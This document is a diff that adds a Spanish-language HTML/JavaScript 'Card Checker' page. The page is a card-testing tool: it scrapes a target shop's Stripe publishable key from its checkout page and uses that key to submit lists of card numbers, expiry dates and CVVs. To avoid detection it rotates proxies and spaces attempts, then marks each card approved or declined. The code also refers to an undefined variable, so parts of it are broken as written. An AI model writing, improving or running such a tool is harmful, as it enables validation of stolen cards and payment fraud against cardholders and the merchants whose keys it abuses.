@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Card Checker – Checkout</title>
+<style>
+:root{
+  --bg:#0f1117;--card:#1a1d2e;--border:#2a2e42;
+  --txt:#e0e4f0;--dim:#7a82a0;--accent:#6c5ce7;
+  --ok:#00d68f;--err:#ff4757;--warn:#ffa502;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--txt);padding:20px;min-height:100vh}
+h1{font-size:1.6rem;margin-bottom:4px}
+h1 span{color:var(--accent)}
+.sub{color:var(--dim);font-size:.85rem;margin-bottom:24px}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;max-width:1100px}
+@media(max-width:800px){.grid{grid-template-columns:1fr}}
+.panel{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:18px}
+.panel h2{font-size:.95rem;color:var(--accent);margin-bottom:12px;text-transform:uppercase;letter-spacing:.5px}
+label{display:block;font-size:.78rem;color:var(--dim);margin-bottom:5px}
+input,textarea{width:100%;background:#12141f;border:1px solid var(--border);border-radius:6px;padding:9px 12px;color:var(--txt);font-size:.88rem;font-family:monospace}
+input:focus,textarea:focus{outline:none;border-color:var(--accent)}
+textarea{resize:vertical;min-height:70px}
+.hint{font-size:.72rem;color:var(--dim);margin-top:5px;line-height:1.4}
+.btn{display:inline-flex;align-items:center;gap:8px;background:var(--accent);color:#fff;border:none;border-radius:7px;padding:12px 28px;font-size:1rem;cursor:pointer;margin-top:20px;font-weight:600}
+.btn:hover{filter:brightness(1.15)}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+.btn-sm{padding:6px 14px;font-size:.78rem;margin-top:8px}
+#results{margin-top:24px;width:100%;max-width:1100px}
+#results table{width:100%;border-collapse:collapse;font-size:.82rem}
+#results th{text-align:left;padding:10px 12px;background:#141627;color:var(--accent);border-bottom:2px solid var(--border);position:sticky;top:0}
+#results td{padding:9px 12px;border-bottom:1px solid var(--border)}
+#results tr:hover td{background:#1e2138}
+.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:.72rem;font-weight:600}
+.b-ok{background:rgba(0,214,143,.15);color:var(--ok)}
+.b-err{background:rgba(255,71,87,.15);color:var(--err)}
+.b-warn{background:rgba(255,165,2,.15);color:var(--warn)}
+.b-info{background:rgba(108,92,231,.15);color:var(--accent)}
+.progress{height:4px;background:var(--border);border-radius:2px;margin-top:16px;overflow:hidden}
+.progress-bar{height:100%;background:var(--accent);width:0%;transition:width .3s}
+#log{margin-top:16px;max-height:200px;overflow-y:auto;background:#12141f;border:1px solid var(--border);border-radius:6px;padding:10px;font-size:.75rem;font-family:monospace;color:var(--dim)}
+#log .t-ok{color:var(--ok)}
+#log .t-err{color:var(--err)}
+#log .t-warn{color:var(--warn)}
+</style>
+</head>
+<body>
+
+<h1>🔍 Card <span>Checker</span></h1>
+<p class="sub">Test real de tarjetas contra checkout (Stripe / Shopify / otros). Luhn + HTTP + Provider detection + Token API.</p>
+
+<div class="grid">
+  <!-- LINK -->
+  <div class="panel">
+    <h2>🔗 Link de Producto</h2>
+    <label>URL directa del producto / checkout</label>
+    <input id="url" type="url" placeholder="https://tienda.com/producto/123" />
+    <p class="hint">Pega el link directo. Si el servidor bloquea CORS, se usa un proxy automático (allorigins).</p>
+    <div style="margin-top:14px">
+      <label>CORS Proxy (fallback)</label>
+      <input id="corsProxy" value="https://api.allorigins.win/raw?url=" placeholder="https://api.allorigins.win/raw?url=" />
+    </div>
+  </div>
+
+  <!-- CARDS -->
+  <div class="panel">
+    <h2>💳 Tarjetas</h2>
+    <label>Una por línea → NÚMERO | MM/YY | CVV</label>
+    <textarea id="cards" placeholder="4242424242424242 | 12/28 | 123&#10;5555555555554444 | 06/26 | 789&#10;378282246310005 | 01/27 | 1234" rows="5"></textarea>
+    <p class="hint">Formato: número (16-19 dígitos) | MM/YY o YY/MM | CVV (3-4). Soporta espacios como separador también.</p>
+  </div>
+
+  <!-- PROXIES -->
+  <div class="panel">
+    <h2>🌐 Proxies</h2>
+    <label>Uno por línea → host:port (HTTP)</label>
+    <textarea id="proxies" placeholder="1.2.3.4:8080&#10;5.6.7.8:3128&#10;10.0.0.1:1080" rows="4"></textarea>
+    <p class="hint">En navegador, los proxies se usan como CORS proxy wrapper (http://host:port/?url=). SOCKS requiere un bridge WS.</p>
+    <button class="btn btn-sm" onclick="testProxy()">⚡ Test Proxy</button>
+  </div>
+
+  <!-- OPTIONS -->
+  <div class="panel">
+    <h2>⚙️ Opciones</h2>
+    <label>Provider a forzar (si no se detecta)</label>
+    <select id="forceProvider" style="width:100%;background:#12141f;border:1px solid var(--border);border-radius:6px;padding:9px;color:var(--txt);margin-top:5px">
+      <option value="auto">Auto-detect</option>
+      <option value="stripe">Stripe</option>
+      <option value="shopify">Shopify Payments</option>
+      <option value="paypal">PayPal</option>
+      <option value="mollie">Mollie</option>
+      <option value="generic">Genérico (solo Luhn+HTTP)</option>
+    </select>
+    <div style="margin-top:12px">
+      <label>Intervalo entre tarjetas (ms)</label>
+      <input id="delay" type="number" value="2000" style="width:100px" />
+    </div>
+    <div style="margin-top:12px;display:flex;gap:10px;align-items:center">
+      <input type="checkbox" id="useCors" checked />
+      <label for="useCors" style="margin:0;font-size:.82rem">Usar CORS proxy fallback si fetch directo falla</label>
+    </div>
+  </div>
+</div>
+
+<button class="btn" id="btnRun" onclick="runChecker()">▶ INICIAR TEST</button>
+
+<div class="progress"><div class="progress-bar" id="pbar"></div></div>
+<div id="log"></div>
+
+<div id="results">
+  <table id="resTable">
+    <thead>
+      <tr>
+        <th>#</th><th>Tarjeta</th><th>Marca</th><th>Luhn</th><th>Exp</th><th>CVV</th>
+        <th>HTTP</th><th>Provider</th><th>Stripe Key</th><th>Token</th><th>Estado</th>
+      </tr>
+    </thead>
+    <tbody id="resBody"></tbody>
+  </table>
+</div>
+
+<script>
+// ─── Luhn ───────────────────────────────────────────
+function luhnCheck(num){
+  const d = num.replace(/\D/g,'');
+  if(d.length < 13 || d.length > 19) return false;
+  let sum=0, dbl=false;
+  for(let i=d.length-1;i>=0;i--){
+    let n=+d[i];
+    if(dbl){n*=2;if(n>9)n-=9;}
+    sum+=n;
+    dbl=!dbl;
+  }
+  return sum%10===0;
+}
+
+// ─── Brand ──────────────────────────────────────────
+function detectBrand(num){
+  const d = num.replace(/\D/g,'');
+  if(/^4/.test(d)) return 'Visa';
+  if(/^(5[1-5]|2[2-7])/.test(d)) return 'MasterCard';
+  if(/^3[47]/.test(d)) return 'Amex';
+  if(/^6(011|5|4[4-9]|47|48)/.test(d)) return 'Discover';
+  if(/^35[2-8]/.test(d)) return 'JCB';
+  if(/^(5018|5020|5038|6500|6501)/.test(d)) return 'Maestro';
+  return 'Unknown';
+}
+
+// ─── Expiry ─────────────────────────────────────────
+function checkExpiry(exp){
+  let m,y;
+  const t = exp.trim();
+  if(t.includes('/')){
+    const p = t.split('/');
+    m = +p[0];
+    y = +p[1].length===2 ? 2000+ +p[1] : +p[1];
+  } else if(t.length===4){
+    m = +t.slice(0,2);
+    y = 2000 + +t.slice(2);
+  } else return {valid:false, reason:'formato'};
+  if(m<1||m>12) return {valid:false, reason:'mes inválido'};
+  const now = new Date();
+  const endMonth = new Date(y, m, 0); // último día del mes
+  if(endMonth < now) return {valid:false, reason:'expirada'};
+  return {valid:true, brand:null};
+}
+
+// ─── CVV ────────────────────────────────────────────
+function checkCvv(cvv, brand){
+  const d = cvv.replace(/\D/g,'');
+  const need = (brand==='Amex') ? 4 : 3;
+  return d.length === need;
+}
+
+// ─── Fetch URL ──────────────────────────────────────
+async function fetchUrl(url, proxy, useCors){
+  const attempts = [];
+  // 1) Direct
+  try{
+    const r = await fetch(url, {method:'GET', redirect:'follow', signal:AbortSignal.timeout(12000)});
+    return {ok:r.ok, status:r.status, html: await r.text(), via:'direct'};
+  } catch(e){ attempts.push('direct: '+e.message); }
+  // 2) Proxy
+  if(proxy){
+    const sep = proxy.includes('?') ? '&' : '?';
+    const purl = `http://${proxy}/${sep}url=${encodeURIComponent(url)}`;
+    try{
+      const r = await fetch(purl, {method:'GET', signal:AbortSignal.timeout(12000)});
+      return {ok:r.ok, status:r.status, html: await r.text(), via:'proxy'};
+    } catch(e){ attempts.push('proxy: '+e.message); }
+  }
+  // 3) CORS proxy
+  if(useCors){
+    const corsBase = document.getElementById('corsProxy').value;
+    try{
+      const r = await fetch(corsBase + encodeURIComponent(url), {method:'GET', signal:AbortSignal.timeout(15000)});
+      return {ok:r.ok, status:r.status, html: await r.text(), via:'cors-proxy'};
+    } catch(e){ attempts.push('cors: '+e.message); }
+  }
+  return {ok:false, status:0, html:'', via:'fail', attempts};
+}
+
+// ─── Detect Provider ────────────────────────────────
+function detectProvider(html, forced){
+  if(forced && forced!=='auto') return forced;
+  const h = html.toLowerCase();
+  if(h.includes('js.stripe.com') || h.includes('stripe.') || /pk_(live|test)_[a-z0-9]{24,}/.test(h)) return 'stripe';
+  if(h.includes('cdn.shopify.com') || h.includes('shopify') || h.includes('shopify_payments')) return 'shopify';
+  if(h.includes('paypal.com') || h.includes('paypal-js')) return 'paypal';
+  if(h.includes('mollie') || h.includes('mollie.com')) return 'mollie';
+  if(h.includes('braintree') || h.includes('braintreegateway')) return 'braintree';
+  return 'generic';
+}
+
+// ─── Extract Stripe PK ──────────────────────────────
+function extractStripeKey(html){
+  const m = html.match(/pk_(live|test)_[a-zA-Z0-9]{20,64}/);
+  return m ? m[0] : null;
+}
+
+// ─── Stripe Token Test (real) ───────────────────────
+async function stripeTokenTest(pk, card){
+  // Usamos el PaymentMethods endpoint (no requiere secret key para tokenización)
+  // El truco: crear un PaymentIntent con confirm=false y luego confirmar con la tarjeta
+  // Pero más simple: usar la tokenización via POST a /v1/tokens (requiere secret)
+  // O usar el endpoint de client-side: crear un PaymentMethod via /v1/payment_methods
+  //
+  // Lo más real desde client-side: usar el Stripe JS SDK
+  // Inyectamos el SDK y creamos un PaymentMethod
+  return new Promise((resolve)=>{
+    const s = document.createElement('script');
+    s.src = `https://js.stripe.com/v3/?v=20240213`;
+    s.onload = async ()=>{
+      try{
+        const stripe = window.Stripe(pk);
+        const {paymentMethod, error} = await stripe.createPaymentMethod({
+          type:'card',
+          card:{
+            number: card.number,
+            exp_month: card.expM,
+            exp_year: card.expY,
+            cvc: card.cvv
+          }
+        });
+        if(error){
+          resolve({ok:false, code:error.code, msg:error.message, id:null});
+        } else {
+          resolve({ok:true, code:'approved', msg:'Token válido', id:paymentMethod.id});
+        }
+      } catch(e){
+        resolve({ok:false, code:'err', msg:e.message, id:null});
+      }
+    };
+    s.onerror = ()=>resolve({ok:false, code:'sdk_load', msg:'No se pudo cargar Stripe JS', id:null});
+    document.head.appendChild(s);
+    // Timeout de seguridad
+    setTimeout(()=>{ if(s.parentNode) s.remove(); resolve({ok:false,code:'timeout',msg:'Timeout SDK',id:null}); }, 10000);
+  });
+}
+
+// ─── Parse Cards ────────────────────────────────────
+function parseCards(text){
+  const lines = text.split('\n').map(l=>l.trim()).filter(Boolean);
+  return lines.map(line=>{
+    let parts = line.split('|').map(p=>p.trim());
+    if(parts.length < 3){
+      parts = line.split(/\s{2,}|\s+\|+\s+/).map(p=>p.trim()).filter(Boolean);
+    }
+    if(parts.length < 3) return null;
+    const num = parts[0];
+    const exp = parts[1];
+    const cvv = parts[2];
+    // Parse expiry
+    let expM=0, expY=0;
+    if(exp.includes('/')){
+      const p = exp.split('/');
+      expM = +p[0];
+      expY = +p[1].length===2 ? 2000+ +p[1] : +p[1];
+    } else if(exp.length===4){
+      expM = +exp.slice(0,2);
+      expY = 2000 + +exp.slice(2);
+    }
+    return {number:num, exp, expM, expY, cvv};
+  }).filter(Boolean);
+}
+
+// ─── Log ────────────────────────────────────────────
+function log(msg, cls=''){
+  const el = document.getElementById('log');
+  const t = new Date().toLocaleTimeString();
+  el.innerHTML += `<div class="${cls}">[${t}] ${msg}</div>`;
+  el.scrollTop = el.scrollHeight;
+}
+
+// ─── Test Proxy ─────────────────────────────────────
+async function testProxy(){
+  const lines = document.getElementById('proxies').value.split('\n').map(l=>l.trim()).filter(Boolean);
+  if(!lines.length) return alert('Agrega al menos un proxy');
+  for(const p of lines){
+    const t0 = performance.now();
+    try{
+      const r = await fetch(`http://${p}/`, {method:'HEAD', signal:AbortSignal.timeout(8000)});
+      log(`✅ ${p} → ${r.status} (${Math.round(performance.now()-t0)}ms)`, 't-ok');
+    } catch(e){
+      log(`❌ ${p} → ${e.message}`, 't-err');
+    }
+  }
+}
+
+// ─── MAIN ───────────────────────────────────────────
+async function runChecker(){
+  const url = document.getElementById('url').value.trim();
+  const cardsRaw = document.getElementById('cards').value;
+  const proxiesRaw = document.getElementById('proxies').value.split('\n').map(l=>l.trim()).filter(Boolean);
+  const delay = +document.getElementById('delay').value || 2000;
+  const useCors = document.getElementById('useCors').checked;
+  const forced = document.getElementById('forceProvider').value;
+
+  if(!url) return alert('Pega la URL del producto');
+  const cards = parseCards(cardsRaw);
+  if(!cards.length) return alert('Agrega al menos una tarjeta');
+
+  document.getElementById('btnRun').disabled = true;
+  document.getElementById('resBody').innerHTML = '';
+  document.getElementById('log').innerHTML = '';
+  document.getElementById('pbar').style.width = '0%';
+
+  log(`▶ Iniciando test: ${url}`, 't-ok');
+  log(`  Tarjetas: ${cards.length} | Proxies: ${proxies.length} | Provider: ${forced}`);
+
+  // Fetch la página (una sola vez)
+  let pageResult = null;
+  let proxy = proxies[0] || null;
+  if(proxy){
+    log(`  Usando proxy: ${proxy}`);
+    pageResult = await fetchUrl(url, proxy, useCors);
+  }
+  if(!pageResult || !pageResult.ok){
+    log(`  Fetch directo/proxy falló, intentando CORS proxy...`);
+    pageResult = await fetchUrl(url, null, true);
+  }
+
+  if(pageResult.ok){
+    log(`  ✅ Página cargada (HTTP ${pageResult.status}, via: ${pageResult.via}, ${pageResult.html.length} bytes)`, 't-ok');
+  } else {
+    log(`  ⚠️ Página no accesible (status: ${pageResult.status}, via: ${pageResult.via}). Se harán solo checks locales.`, 't-warn');
+  }
+
+  const provider = detectProvider(pageResult?.html || '', forced);
+  const stripeKey = provider==='stripe' ? extractStripeKey(pageResult?.html || '') : null;
+  log(`  Provider detectado: ${provider}${stripeKey ? ' | PK: '+stripeKey : ''}`, 't-ok');
+
+  // Test each card
+  for(let i=0; i<cards.length; i++){
+    const c = cards[i];
+    document.getElementById('pbar').style.width = `${Math.round((i/cards.length)*100)}%`;
+
+    const brand = detectBrand(c.number);
+    const luhn = luhnCheck(c.number);
+    const expRes = checkExpiry(c.exp);
+    const cvvOk = checkCvv(c.cvv, brand);
+
+    log(`  ── Tarjeta ${i+1}/${cards.length}: ${c.number.slice(0,4)}••••${c.number.slice(-4)} (${brand})`);
+
+    // Stripe token test
+    let tokenResult = null;
+    if(stripeKey && luhn && expRes.valid){
+      log(`    Intentando Stripe token...`);
+      tokenResult = await stripeTokenTest(stripeKey, c);
+      log(`    Stripe: ${tokenResult.ok ? '✅ '+tokenResult.msg : '❌ '+tokenResult.code+' – '+tokenResult.msg}`, tokenResult.ok?'t-ok':'t-err');
+    }
+
+    // Determine final status
+    let status, statusCls;
+    if(tokenResult?.ok){
+      status = 'APPROVED (Token)'; statusCls = 'b-ok';
+    } else if(!luhn){
+      status = 'LUHN FAIL'; statusCls = 'b-err';
+    } else if(!expRes.valid){
+      status = 'EXPIRED'; statusCls = 'b-err';
+    } else if(!cvvOk){
+      status = 'CVV FORMAT'; statusCls = 'b-warn';
+    } else if(tokenResult && !tokenResult.ok){
+      status = 'DECLINED ('+tokenResult.code+')'; statusCls = 'b-err';
+    } else if(pageResult?.ok){
+      status = 'LOCAL OK (no token)'; statusCls = 'b-warn';
+    } else {
+      status = 'LOCAL ONLY'; statusCls = 'b-info';
+    }
+    log(`    → ${status}`, statusCls==='b-ok'?'t-ok':statusCls==='b-err'?'t-err':'t-warn');
+
+    // Add row
+    const masked = c.number.slice(0,4)+'••••'+c.number.slice(-4);
+    const row = `<tr>
+      <td>${i+1}</td>
+      <td><code>${masked}</code></td>
+      <td><span class="badge b-info">${brand}</span></td>
+      <td>${luhn?'✅':'❌'}</td>
+      <td>${expRes.valid?'✅':expRes.reason}</td>
+      <td>${cvvOk?'✅':'❌'}</td>
+      <td>${pageResult?.ok?'✅ '+pageResult.status:'❌'}</td>
+      <td>${provider}</td>
+      <td>${stripeKey?'✅':'—'}</td>
+      <td>${tokenResult ? (tokenResult.ok?'✅':'❌ '+tokenResult.code) : '—'}</td>
+      <td><span class="badge ${statusCls}">${status}</span></td>
+    </tr>`;
+    document.getElementById('resBody').insertAdjacentHTML('beforeend', row);
+
+    if(i < cards.length-1) await new Promise(r=>setTimeout(r, delay));
+  }
+
+  document.getElementById('pbar').style.width = '100%';
+  log('✓ Finalizado.', 't-ok');
+  document.getElementById('btnRun').disabled = false;
+}
+</script>
+</body>
+</html>
